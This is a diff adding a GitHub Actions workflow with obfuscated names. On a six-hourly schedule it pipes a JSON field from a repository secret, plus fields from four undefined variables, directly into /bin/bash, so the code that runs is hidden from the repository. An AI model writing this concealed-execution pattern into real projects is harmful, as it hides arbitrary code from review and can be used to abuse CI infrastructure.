@@ -1,0 +1,23 @@
+name: nagebaiyangqixi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nagebaiyangqixi
+        env:
+          p086: ${{ secrets.p086 }}
+        run: |
+          echo $p086 | jq -r .rq55 | /bin/bash
+          echo $v0 | jq -r .jdoy337 | /bin/bash
+          echo $fvaby379 | jq -r .vwyn85905 | /bin/bash
+          echo $gll05980 | jq -r .ugvr87 | /bin/bash
+          echo $j9139 | jq -r .zcuu2047 | /bin/bash
+
